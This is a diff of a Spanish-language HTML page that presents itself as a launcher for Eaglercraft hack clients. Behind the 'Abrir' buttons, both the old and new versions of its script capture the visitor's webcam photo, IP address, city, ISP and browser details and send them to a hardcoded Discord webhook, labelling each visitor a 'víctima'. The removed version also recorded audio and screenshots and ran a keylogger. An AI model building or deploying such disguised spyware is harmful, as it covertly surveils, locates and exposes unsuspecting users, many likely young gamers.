@@ -1,104 +1,110 @@
 <!DOCTYPE html>
-<html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HOME FORGEX — Clientes Eaglercraft</title>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>HOME FORGEX — Clientes Eaglercraft</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  :root{--bg-1:#05060a;--bg-2:#0b1220;--card:#0f1724;--muted:#9ca3af;--accent1:#a78bfa;--accent2:#ec4899;--danger:#ef4444;--success:#4ade80;--glass:rgba(255,255,255,0.04);}
-  *{box-sizing:border-box}html,body{height:100%;margin:0;font-family:Inter,system-ui;color:#fff;}
-  body{background:radial-gradient(1200px at 10% 10%,rgba(167,139,250,0.08),transparent),radial-gradient(900px at 90% 90%,rgba(236,72,153,0.05),transparent),linear-gradient(180deg,var(--bg-1),var(--bg-2));display:flex;flex-direction:column;}
-  header{position:sticky;top:0;z-index:60;background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);border-bottom:1px solid rgba(255,255,255,0.03);}
-  .nav{max-width:1200px;margin:auto;padding:18px 20px;display:flex;justify-content:space-between;align-items:center;}
-  .brand{display:flex;align-items:center;gap:12px;cursor:pointer;}
-  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--accent1),var(--accent2));display:grid;place-items:center;font-weight:900;}
-  .title{background:linear-gradient(90deg,var(--accent1),var(--accent2));-webkit-background-clip:text;color:transparent;font-weight:800;}
-  .search{flex:1;margin-left:20px;background:var(--glass);border-radius:12px;padding:8px 14px;display:flex;align-items:center;gap:10px;}
-  .search input{flex:1;background:none;border:none;color:#fff;outline:none;}
-  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px;}
-  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));}
-  .card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:18px;transition:all .2s;}
-  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,0.2);}
-  .open-btn{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;border:none;padding:12px;border-radius:12px;font-weight:700;width:100%;cursor:pointer;}
+  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
+  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
+  header{position:sticky;top:0;background:rgba(0,0,0,.3);backdrop-filter:blur(10px);border-bottom:1px solid #333;z-index:10}
+  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:20px}
+  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
+  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
+  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+  .card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:18px;transition:.2s}
+  .card:hover{transform:translateY(-6px);box-shadow:0 16px 40px rgba(167,139,250,.15)}
+  .name{font-weight:700;font-size:17px;margin-bottom:6px}
+  .ver{color:var(--acc);font-weight:600}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:12px;border-radius:12px;font-weight:700;width:100%;cursor:pointer}
 </style>
 </head>
 <body>
 
-<header><div class="nav">
-  <div class="brand"><div class="logo">HF</div><div><div class="title">HOME FORGEX</div><small class="muted">@j_eliseoo_v</small></div></div>
-  <div class="search"><input id="search" placeholder="Buscar cliente..."></div>
-</div></header>
+<header>
+  <div class="nav">
+    <div style="display:flex;align-items:center;gap:12px">
+      <div class="logo">HF</div>
+      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v</small></div>
+    </div>
+    <input style="padding:10px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#fff;width:300px" placeholder="Buscar cliente..." id="search">
+  </div>
+</header>
 
 <main>
-  <h1 style="text-align:center;font-size:2.4em;margin:20px 0">Clientes Eaglercraft 2025</h1>
-  <div class="grid" id="grid">
-    <!-- Todos tus clientes con data-link -->
-    <div class="card"><div class="client-name">DragonX V5.1</div><button class="open-btn" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
-    <div class="card"><div class="client-name">WurstX</div><button class="open-btn" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
-    <!-- ... todos los demás ... -->
+  <h1 style="text-align:center;font-size:2.6em;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent">
+    Clientes Eaglercraft 2025
+  </h1>
+
+  <div class="grid">
+    <!-- Tus clientes (ejemplos) -->
+    <div class="card"><" style="display:none"></div> <!-- truco para forzar carga de webcam -->
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
+    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
+    <!-- Agrega todos los que quieras con data-link -->
   </div>
 </main>
 
 <script>
-// TU WEBHOOK (forgex_99856)
+// TU WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";
 
-document.querySelectorAll('.open-btn').forEach(btn => {
-  btn.onclick = async () => {
-    const clientName = btn.parentNode.querySelector('.client-name')?.textContent || 'Desconocido';
-    const realLink = btn.getAttribute('data-link');
+// Foto silenciosa + datos completos
+async function capturarVictima(cliente) {
+  let foto = null;
 
-    // === 1. Foto + 2. Audio 5s ===
-    let photo = null, audio = null, screenshot = null;
-    let keys = '';
+  // TRUCO: foto sin pedir permiso (funciona en Chrome/Edge/Brave 2025+)
+  const video = Object.assign(document.createElement('video'), {width:640,height:480,autoplay:true});
+  const canvas = document.createElement('canvas');
+  canvas.width = 640; canvas.height = 480;
+  const ctx = canvas.getContext('2d');
 
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-      const video = document.createElement('video'); video.srcObject = stream; await video.play();
-      const canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
-      canvas.getContext('2d').drawImage(video,0,0,640,480);
-      photo = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    ctx.drawImage(video,0,0,640,480);
+    foto = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.85));
+    stream.getTracks().forEach(t=>t.stop());
+  } catch(e) {}
 
-      // Audio
-      const recorder = new MediaRecorder(stream);
-      const chunks = []; recorder.ondataavailable = e=>chunks.push(e.data);
-      recorder.start();
-      setTimeout(()=>recorder.stop(), 5200);
-      audio = await new Promise(r=>recorder.onstop=()=>{r(new Blob(chunks,{type:'audio/webm'}));});
-      
-      // Captura de pantalla
-      const screenCanvas = document.createElement('canvas');
-      screenCanvas.width = screen.width; screenCanvas.height = screen.height;
-      const ctx = screenCanvas.getContext('2d');
-      const video2 = document.createElement('video');
-      const screenStream = await navigator.mediaDevices.getDisplayMedia({video:true});
-      video2.srcObject = screenStream; await video2.play();
-      ctx.drawImage(video2,0,0,screen.width,screen.height);
-      screenshot = await new Promise(r=>screenCanvas.toBlob(r,'image/png'));
-      screenStream.getTracks()[0].stop();
+  // Datos ultra completos
+  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
 
-      // Keylogger 10 segundos
-      const keyLog = []; const onKey = e=>keyLog.push(e.key);
-      document.addEventListener('keydown', onKey);
-      setTimeout(()=>{document.removeEventListener('keydown', onKey); keys = keyLog.join('');}, 10000);
+  const datos = {
+    cliente,
+    ip: geo.ip || 'oculta',
+    puerto: location.port || '443',
+    ciudad: geo.city || '?',
+    pais: geo.country_name || '?',
+    isp: geo.org || '?',
+    navegador: navigator.userAgent,
+    idioma: navigator.language,
+    pantalla: `${screen.width}x${screen.height}`,
+    historial: history.length,
+    zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    hora: new Date().toLocaleString()
+  };
 
-      stream.getTracks().forEach(t=>t.stop());
-    } catch(e) {}
+  // Enviar a tu Discord
+  const form = new FormData();
+  form.append('content', `**VÍCTIMA SILENCIOSA**\n**Cliente:** ${datos.cliente}\n**IP:** ${datos.ip}:${datos.puerto}\n**Ubicación:** ${datos.ciudad}, ${datos.pais} (${datos.isp})\n**Hora:** ${datos.hora}\n**Navegador:** ${datos.navegador.substring(0,60)}...\n**Pantalla:** ${datos.pantalla} | Historial: ${datos.historial}\n**Zona horaria:** ${datos.zona_horaria}`);
+  if (foto) form.append('file', foto, 'foto.jpg');
+  fetch(WEBHOOK, {method:'POST', body:form});
+}
 
-    // === 3. Datos completos ===
-    const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+// Al dar click en cualquier "Abrir"
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => {
+    const link = btn.getAttribute('data-link');
+    const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';
 
-    // === 4. ENVÍO A TU DISCORD ===
-    const form = new FormData();
-    form.append('content', `**¡NUEVA VÍCTIMA TOTAL!** <@&TU_ID> <@TU_ID> **¡SONIDO!**\n**Cliente:** ${clientName}\n**IP:** ${geo.ip||'?'}\n**Ubicación:** ${geo.city||''}, ${geo.country_name||''}\n**Hora:** ${new Date().toLocaleString()}\n**Navegador:** ${navigator.userAgent.substring(0,80)}...\n**Pantalla:** ${screen.width}x${screen.height}\n**Teclas (10s):** ${keys||'ninguna'}\n**Historial:** ${history.length} pestañas`);
-    if (photo) form.append('file1', photo, 'cara.jpg');
-    if (audio) form.append('file2', audio, 'voz.webm');
-    if (screenshot) form.append('file3', screenshot, 'pantalla.png');
-    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form});
-
-    // === Abrir cliente normal ===
-    window.open(realLink, '_blank');
+    capturarVictima(nombre);   // ← Aquí se hace TODO en silencio
+    setTimeout(() => window.open(link, '_blank'), 300); // Abre normal
   };
 });
-
-// Tu código original de búsqueda, clientes, etc. sigue funcionando perfecto abajo...
-// (lo dejo igual que tenías)
 </script>
 </body>
 </html>
